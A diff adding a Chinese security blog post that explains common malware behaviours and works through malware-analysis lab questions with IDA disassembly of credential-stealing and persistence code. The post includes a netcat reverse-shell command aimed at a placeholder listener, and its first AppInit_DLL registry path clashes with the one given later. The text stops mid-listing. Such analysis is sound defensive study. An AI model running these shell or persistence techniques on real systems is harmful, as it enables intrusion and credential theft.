@@ -1,0 +1,1196 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="恶意代码分析,恶意行为分析,特洛伊木马化技术,ShellCode植入," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Hvnt3r's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="恶意代码行为 知识点本章中会介绍恶意代码常见的恶意行为，方便我们识别各种各样的恶意程序。 下载器和启动器：常见的两种恶意代码是下载器和启动器。下载器从互联网上下载其他的恶意代码，然后在本地系统中运行，通常使用WindowsAPI函数URLDownloadtoFileA和WinExec，来下载并运行新的恶意代码。启动器也成为加载器，是一类可执行文件，用来安装立即运行或者将来运行的恶意代码。 后门：后">
+<meta name="keywords" content="恶意代码分析,恶意行为分析,特洛伊木马化技术,ShellCode植入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="恶意代码行为">
+<meta property="og:url" content="https://hvnt3r.top/2019/03/恶意代码行为/index.html">
+<meta property="og:site_name" content="Hvnt3r&#39;s Blog">
+<meta property="og:description" content="恶意代码行为 知识点本章中会介绍恶意代码常见的恶意行为，方便我们识别各种各样的恶意程序。 下载器和启动器：常见的两种恶意代码是下载器和启动器。下载器从互联网上下载其他的恶意代码，然后在本地系统中运行，通常使用WindowsAPI函数URLDownloadtoFileA和WinExec，来下载并运行新的恶意代码。启动器也成为加载器，是一类可执行文件，用来安装立即运行或者将来运行的恶意代码。 后门：后">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://i.loli.net/2019/03/21/5c92e2d4b1d97.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/21/5c92e4d4113dd.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/21/5c933c2f74f97.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/24/5c972de3c9b9f.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/24/5c972df904409.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/24/5c972fa1d5de8.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/24/5c97323378bd9.png">
+<meta property="og:updated_time" content="2019-03-24T08:12:57.248Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="恶意代码行为">
+<meta name="twitter:description" content="恶意代码行为 知识点本章中会介绍恶意代码常见的恶意行为，方便我们识别各种各样的恶意程序。 下载器和启动器：常见的两种恶意代码是下载器和启动器。下载器从互联网上下载其他的恶意代码，然后在本地系统中运行，通常使用WindowsAPI函数URLDownloadtoFileA和WinExec，来下载并运行新的恶意代码。启动器也成为加载器，是一类可执行文件，用来安装立即运行或者将来运行的恶意代码。 后门：后">
+<meta name="twitter:image" content="https://i.loli.net/2019/03/21/5c92e2d4b1d97.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://hvnt3r.top/2019/03/恶意代码行为/"/>
+
+
+
+
+
+  <title>恶意代码行为 | Hvnt3r's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband">
+	<a href="https://github.com/Hvnt3r"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_gray_6d6d6d.png" alt="Fork me on GitHub"></a>
+	</div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta custom-logo">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hvnt3r's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">让我们来猎杀那些陷入黑暗中的人吧-Shauna Vayne</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-主🐷页">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            主🐷页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-系列文章💎">
+          <a href="/series/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            系列文章💎
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于我😎">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于我😎
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-标签👀">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签👀
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类👅">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类👅
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-所有文章📖">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            所有文章📖
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-友情链接👥">
+          <a href="/friends/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-link"></i> <br />
+            
+            友情链接👥
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://hvnt3r.top/2019/03/恶意代码行为/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Hvnt3r">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hvnt3r's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">恶意代码行为</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-20T11:08:22+08:00">
+                2019-03-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/二进制安全/" itemprop="url" rel="index">
+                    <span itemprop="name">二进制安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2019/03/恶意代码行为/" class="leancloud_visitors" data-flag-title="恶意代码行为">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Visitors&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+				 <span>°C</span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  5.1k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  22
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="恶意代码行为"><a href="#恶意代码行为" class="headerlink" title="恶意代码行为"></a>恶意代码行为</h1><hr>
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>本章中会介绍恶意代码常见的恶意行为，方便我们识别各种各样的恶意程序。</p>
+<p><strong>下载器和启动器：</strong>常见的两种恶意代码是下载器和启动器。下载器从互联网上下载其他的恶意代码，然后在本地系统中运行，通常使用<code>WindowsAPI</code>函数<code>URLDownloadtoFileA</code>和<code>WinExec</code>，来下载并运行新的恶意代码。启动器也成为加载器，是一类可执行文件，用来安装立即运行或者将来运行的恶意代码。</p>
+<p><strong>后门：</strong>后门可以让攻击者远程访问一个受害的机器。通常使用80端口的HTTP协议与控制机器进行通信。</p>
+<a id="more"></a>
+<p><strong>反向Shell：</strong>反向Shell是从受害者主机发起的向攻击者连接，为攻击者提供被感染机器的访问权限，一般有如下反向弹Shell的方式：</p>
+<ul>
+<li>NetCat：网络瑞士军刀，可以通过命令<code>nc listener_ip 80 -e cmd.exe</code>来弹Shell。</li>
+<li>Windows反向Shell：使用<code>cmd.exe</code>作为反向Shell，首先创建一个套接字并于远程服务器简历连接。然后绑定这个套接字与<code>cmd.exe</code>的标准流再调用<code>CreateProcess</code>函数用隐藏窗口的方式创建cmd.exe。也可以使用多线程方式：使用<code>CreatPipe</code>来绑定一个通道的读写端，如标准输入标准输出，<code>CreateProcess</code>函数用来绑定一个管道与标准流，而不是直接与套接字绑定。调用<code>CreateProcess</code>方法，恶意代码会产生两个线程，一个用来从标准输入管道读取数据，并向套接字写数据，另外一个用来从一个套接字读数据，并向一个标准管道中写数据。通常这两个线程使用数据编码来混淆数据。</li>
+</ul>
+<p><strong>远程控制工具：</strong>远程控制工具RAT能被用来管理一台或者多台计算机。远程控制工具进场为了特定目标，如窃取信息或者旁路一个网络执行针对性的攻击。</p>
+<p><strong>僵尸网络：</strong>僵尸网络是被感染主机的一个集合。他们由单一实体控制，其目标同行是为了进行DDoS攻击。</p>
+<p><strong>登陆凭证窃密器：</strong>攻击者通常使用以下三种方法进行登陆凭证的窃取：</p>
+<ul>
+<li>等待用户登陆以窃取登陆凭证</li>
+<li>击键记录器</li>
+<li>转储Windows系统中存放的信息，如密码hash值，程序直接使用它或者对它进行离线爆破。</li>
+</ul>
+<p><strong>特殊注册表：</strong>恶意代码编写者可以通过一个名为<code>AppInit_DLL</code>特殊注册表项来让他们的DLL得到加载，此注册表项中的DLL程序回在进程加载<code>User32.dll</code>时被加载，<code>AppInit_DLL</code>位置如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost</span><br></pre></td></tr></table></figure>
+<p>恶意代码编写者可以挂钩一个特殊的<code>Winlogon Notify</code>事件，如登陆、注销、关机、锁屏等，这些甚至允许恶意代码再安全模式下加载，以下注册表键中的注册表项包含Notify值：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\</span><br></pre></td></tr></table></figure>
+<p><code>Windows</code>所有的服务都存在与注册表中，恶意代码经常作为一个服务安装，安装的恶意代码作为<code>svchost.exe</code>的DLL来存活，这使得恶意代码可以与其他进程混淆，更像一个标准的服务。<code>svchost.exe</code>时从动态链接库中运行服务的通用主机进程，<code>Windows</code>操作系统通常用以时刻运行多个<code>svchost.exe</code>实例，每个实例包含一组服务，这些组定义子啊下列的注册表位置：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost</span><br></pre></td></tr></table></figure>
+<p>服务被定义在如下位置：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\ServiceName</span><br></pre></td></tr></table></figure>
+<p><strong>特洛伊木马化（Trojanized）系统二进制文件：</strong>此技术可以直接修改系统的二进制文件，当被感染的二进制文件运行或加载时，将会强制运行恶意代码，恶意代码通常修改一个系统文件的函数入口点，使它跳转到恶意代码，这些修改补丁覆盖函数的开始代码或者覆盖其他的一些并不影响特洛伊木马化DLL正常操作的代码，为了不影响二进制文件的正常操作，恶意代码经常被加到一个可执行文件的空节中，插入的代码并不关心他被插入到感染的DLL的位置。加载恶意代码后，为了让DLL的操作与插入前的一致，代码会跳转回原始的DLL程序。</p>
+<p><strong>DLL加载顺序劫持：</strong>这是一种简单而隐蔽的指数，它允许恶意代码编写者再不适用注册表项或者特洛伊二进制文件的前提下创建一个存活的、恶意的DLL程序，这种技术甚至不需要单独的恶意加载器。以下是再Windows XP中加载DLL的默认搜索顺序：</p>
+<ul>
+<li>加载应用程序的目录</li>
+<li>当前目录</li>
+<li>系统目录（使用<code>GetSystemDirectory</code>函数获取的路径）</li>
+<li>16位子系统的系统目录</li>
+<li>Windows目录</li>
+<li>PATH环境变量中列出的目录</li>
+</ul>
+<p>在<code>WindowsXP</code>中利用<code>KnownDLL</code>注册表键可以跳过DLL的加载过程，这注册表键保护一些特定的DLL位置列表。DLL加载顺序劫持可以被<code>System32</code>之外的目录中的二进制文件利用，来加载未被<code>KnownDLL</code>保护的DLL程序。由于DLL递归导入的原因，很多DLL会在加载其他的DLL，而这些DLL按照默顺序加载，因此<code>KnownDLL</code>机制也不能得到充分的保护。</p>
+<p><strong>提权：</strong>多数提权攻击时利用本地系统已知漏洞或者0Day漏洞进行攻击。DLL加载顺序劫持也可以被用来进行提权操作，加入恶意DLL所在的目录是用户可写的，并且加载这个DLL的进程在一个高特权级上运行，那么DLL就获得了提权。</p>
+<p><strong>使用SeDebugPrivilege进行提权：</strong>在Windows系统中，访问令牌是一个包含进程安全描述符的对象，安全描述符用来指定拥有者的访问权限，SeDebugPrivilege特权作为一个系统级别调试的工具被创建，默认情况下，SeDebugPrivilege只赋给本地系统账户权限。普通的用户账号不能给自身赋予SeDebugPrivilege权限。</p>
+<p><strong>IAT Hook：</strong>这是一种在用户空间中很常见的Rootkit方法，它隐藏本地系统中的文件、进程以及网络连接，这种Hook方法修改导入地址表（IAT）或者导出地址表（EAT）从而改变程序的执行流程，但是这种方法很容易被检测出来。</p>
+<p><strong>Inline Hook：</strong>这种方法使用过覆盖导入DLL中的API函数的代码来实现的，所以它必须等到DLL被加载后才能执行。IAT Hook知识简单的修改函数指针，但是Inline Hook将修改实际的函数代码。恶意Rootkit通常使用一个跳转指令替换函数的开始代码来执行Inline Hook，这个跳转指令使Rootkit插入的恶意代码获取执行，另外Rootkit还可以通过改变函数的代码来破坏它或者改变它，而不是跳转到恶意代码。</p>
+<h2 id="课后练习"><a href="#课后练习" class="headerlink" title="课后练习"></a>课后练习</h2><h3 id="Lab11-1"><a href="#Lab11-1" class="headerlink" title="Lab11-1"></a>Lab11-1</h3><p><strong>分析恶意代码Lab11-01.exe</strong></p>
+<p><strong>问题</strong></p>
+<p><strong>1.这个恶意代码项磁盘释放了什么？</strong></p>
+<p>通过静态分析，在004010C9位置发现如下代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">.text:004010B8                 mov     eax, lpType</span><br><span class="line">.text:004010BD                 push    eax             ; lpType</span><br><span class="line">.text:004010BE                 mov     ecx, lpName</span><br><span class="line">.text:004010C4                 push    ecx             ; lpName</span><br><span class="line">.text:004010C5                 mov     edx, [ebp+hModule]</span><br><span class="line">.text:004010C8                 push    edx             ; hModule</span><br><span class="line">.text:004010C9                 call    ds:FindResourceA</span><br><span class="line">.text:004010CF                 mov     [ebp+hResInfo], eax</span><br><span class="line">.text:004010D2                 cmp     [ebp+hResInfo], 0</span><br><span class="line">.text:004010D6                 jnz     short loc_4010DF</span><br><span class="line">.text:004010D8                 xor     eax, eax</span><br><span class="line">.text:004010DA                 jmp     loc_4011BF</span><br><span class="line">.text:004010DF ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004010DF</span><br><span class="line">.text:004010DF loc_4010DF:                             ; CODE XREF: sub_401080+56↑j</span><br><span class="line">.text:004010DF                 mov     eax, [ebp+hResInfo]</span><br><span class="line">.text:004010E2                 push    eax             ; hResInfo</span><br><span class="line">.text:004010E3                 mov     ecx, [ebp+hModule]</span><br><span class="line">.text:004010E6                 push    ecx             ; hModule</span><br><span class="line">.text:004010E7                 call    ds:LoadResource</span><br><span class="line">.text:004010ED                 mov     [ebp+hResData], eax</span><br><span class="line">.text:004010F0                 cmp     [ebp+hResData], 0</span><br><span class="line">.text:004010F4                 jnz     short loc_4010FB</span><br><span class="line">.text:004010F6                 jmp     loc_4011A5</span><br><span class="line">.text:004010FB ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004010FB</span><br><span class="line">.text:004010FB loc_4010FB:                             ; CODE XREF: sub_401080+74↑j</span><br><span class="line">.text:004010FB                 mov     edx, [ebp+hResData]</span><br><span class="line">.text:004010FE                 push    edx             ; hResData</span><br><span class="line">.text:004010FF                 call    ds:LockResource</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/03/21/5c92e2d4b1d97.png" alt=""></p>
+<p>在资源节发现了名为TGAD的节，程序对此节进行了二进制资源的提取。</p>
+<p><img src="https://i.loli.net/2019/03/21/5c92e4d4113dd.png" alt=""></p>
+<p>因此程序在磁盘上释放的文件是从资源节中提取出来的数据存储为<code>msgina32.dll</code>。</p>
+<p><strong>2.这个恶意代码如何进行驻留？</strong></p>
+<p>根据如下代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">.text:00401004                 push    0               ; lpdwDisposition</span><br><span class="line">.text:00401006                 lea     eax, [ebp+phkResult]</span><br><span class="line">.text:00401009                 push    eax             ; phkResult</span><br><span class="line">.text:0040100A                 push    0               ; lpSecurityAttributes</span><br><span class="line">.text:0040100C                 push    0F003Fh         ; samDesired</span><br><span class="line">.text:00401011                 push    0               ; dwOptions</span><br><span class="line">.text:00401013                 push    0               ; lpClass</span><br><span class="line">.text:00401015                 push    0               ; Reserved</span><br><span class="line">.text:00401017                 push    offset SubKey   ; &quot;SOFTWARE\\Microsoft\\Windows NT\\Curren&quot;...</span><br><span class="line">.text:0040101C                 push    80000002h       ; hKey</span><br><span class="line">.text:00401021                 call    ds:RegCreateKeyExA</span><br><span class="line">.text:00401027                 test    eax, eax</span><br><span class="line">.text:00401029                 jz      short loc_401032</span><br><span class="line">.text:0040102B                 mov     eax, 1</span><br><span class="line">.text:00401030                 jmp     short loc_40107B</span><br><span class="line">.text:00401032                 mov     ecx, [ebp+cbData]</span><br><span class="line">.text:00401035                 push    ecx             ; cbData</span><br><span class="line">.text:00401036                 mov     edx, [ebp+lpData]</span><br><span class="line">.text:00401039                 push    edx             ; lpData</span><br><span class="line">.text:0040103A                 push    1               ; dwType</span><br><span class="line">.text:0040103C                 push    0               ; Reserved</span><br><span class="line">.text:0040103E                 push    offset ValueName ; &quot;GinaDLL&quot;</span><br><span class="line">.text:00401043                 mov     eax, [ebp+phkResult]</span><br><span class="line">.text:00401046                 push    eax             ; hKey</span><br><span class="line">.text:00401047                 call    ds:RegSetValueExA</span><br><span class="line">.text:0040104D                 test    eax, eax</span><br><span class="line">.text:0040104F                 jz      short loc_401062</span><br><span class="line">.text:00401051                 mov     ecx, [ebp+phkResult]</span><br><span class="line">.text:00401054                 push    ecx             ; hObject</span><br><span class="line">.text:00401055                 call    ds:CloseHandle</span><br></pre></td></tr></table></figure>
+<p>得知恶意代码写入注册表项<code>SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code>并设置了值<code>GinaDLL</code>。</p>
+<p><strong>3.这个恶意代码如何窃取用户登陆凭证？</strong></p>
+<p>在msgina32.dll文件的导出函数中发现了大量的以<code>Wlx</code>开头的函数名：</p>
+<p><img src="https://i.loli.net/2019/03/21/5c933c2f74f97.png" alt=""></p>
+<p>这些函数都会调用函数<code>sub_10001000()</code>，此函数会直接将调用函数的名称用<code>GetProcAddress</code>函数在<code>msgina.dll</code>文件中查找此函数的地址并将执行流程交给目标函数，目标函数执行完成之后又会返回到恶意程序中，<code>msgina32.dll</code>中的大部分<code>Wlx</code>开头的函数都是这个结构，但是在函数<code>WlxLoggedOutSAS</code>中却不一样，在<code>WlxLoggedOutSAS</code>中调用了函数<code>sub_10001570()</code>向文件<code>msutil32.sys</code>存储了用户凭证的数据。</p>
+<p><strong>4.这个恶意代码对窃取的证书做了什么处理？</strong></p>
+<p>通过查看<code>10001570</code>处代码找到程序将窃取的证书存储在了一个名为<code>msutil32.sys</code>的文件中。</p>
+<p><strong>5.如何在你的测试环境让这个恶意代码获得用户登陆凭证？</strong></p>
+<p>函数<code>WlxLoggedOutSAS</code>的调用发生在用户注销时，因此我们注销重启后就能看到用户登陆凭证。</p>
+<h3 id="Lab11-2"><a href="#Lab11-2" class="headerlink" title="Lab11-2"></a>Lab11-2</h3><p><strong>分析恶意代码Lab11-02.dll。假设一个名为Lab11-02.ini的可疑文件与这个恶意代码一同被发现。</strong></p>
+<p><strong>问题</strong></p>
+<p><strong>1.这个恶意DLL导出了什么？</strong></p>
+<p>这个DLL有两个导出函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Name	Address	Ordinal</span><br><span class="line">installer	1000158B	1</span><br><span class="line">DllEntryPoint	100017E9	[main entry]</span><br></pre></td></tr></table></figure>
+<p><strong>2.使用rundll32.exe安装这个恶意代码之后，发生了什么？</strong></p>
+<p>使用命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe Lab11_02.dll, installer</span><br></pre></td></tr></table></figure>
+<p>程序会在<code>SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</code>写入自身，并且将<code>spoolvxx32.dll</code>写入到系统目录中。</p>
+<p><strong>3.为了使这个恶意代码正确安装，Lab11-02.ini必须被放置在何处？</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:1000166F                 push    0               ; hTemplateFile</span><br><span class="line">.text:10001671                 push    80h             ; dwFlagsAndAttributes</span><br><span class="line">.text:10001676                 push    3               ; dwCreationDisposition</span><br><span class="line">.text:10001678                 push    0               ; lpSecurityAttributes</span><br><span class="line">.text:1000167A                 push    1               ; dwShareMode</span><br><span class="line">.text:1000167C                 push    80000000h       ; dwDesiredAccess</span><br><span class="line">.text:10001681                 mov     eax, [ebp+Dest]</span><br><span class="line">.text:10001684                 push    eax             ; lpFileName</span><br><span class="line">.text:10001685                 call    ds:CreateFileA</span><br></pre></td></tr></table></figure>
+<p>此处程序会尝试访问系统目录下的<code>Lab11-02.ini</code>文件，如果此文件存在则继续执行，否则退出，因此我们需要将<code>Lab11-02.ini</code>放在系统目录下。</p>
+<p><strong>4.这个安装的恶意代码如何驻留？</strong></p>
+<p>通过在注册表<code>SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</code>中添加<code>spoolvxx32.dll</code>。</p>
+<p><strong>5.这个恶意代码采用的用户态Rootkit技术是什么？</strong></p>
+<p>Inline Hook</p>
+<p><strong>6.挂钩代码做了什么？</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">.text:10001203                 push    ebp</span><br><span class="line">.text:10001204                 mov     ebp, esp</span><br><span class="line">.text:10001206                 sub     esp, 0Ch</span><br><span class="line">.text:10001209                 mov     eax, [ebp+arg_4]</span><br><span class="line">.text:1000120C                 sub     eax, [ebp+lpAddress]</span><br><span class="line">.text:1000120F                 sub     eax, 5</span><br><span class="line">.text:10001212                 mov     [ebp+var_4], eax</span><br><span class="line">.text:10001215                 lea     ecx, [ebp+flOldProtect]</span><br><span class="line">.text:10001218                 push    ecx             ; lpflOldProtect</span><br><span class="line">.text:10001219                 push    40h             ; 